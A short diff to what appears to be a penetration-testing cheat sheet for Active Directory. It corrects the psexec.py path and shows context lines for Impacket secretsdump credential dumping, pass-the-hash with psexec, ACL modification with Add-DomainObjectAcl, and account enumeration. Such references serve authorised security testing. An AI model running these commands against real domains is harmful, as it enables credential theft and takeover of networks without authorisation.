@@ -650,7 +650,6 @@ upload {FILE.exe}
 ![Active Directory](https://raw.githubusercontent.com/Orange-Cyberdefense/arsenal/master/mindmap/pentest_ad.png)
 
 ```bash
-
 # Enumerate all local accounts
 net user
 
@@ -694,7 +693,7 @@ Add-DomainObjectAcl -Credential $cred -TargetIdentity "DC={DOMAIN1},DC={DOMAIN2}
 sudo python3 /usr/share/doc/python3-impacket/examples/secretsdump.py '{DOMAIN}/{USERNAME}':'{PASSWORD}'@{IP ADDRESS}
 
 # PSEXEC
-sudo python3 psexec.py -hashes {HASH1:HASH2} {USERNAME}@{IP ADDRESS}
+sudo python3 /usr/share/doc/python3-impacket/examples/psexec.py -hashes {HASH1:HASH2} {USERNAME}@{IP ADDRESS}
 
 ```
 
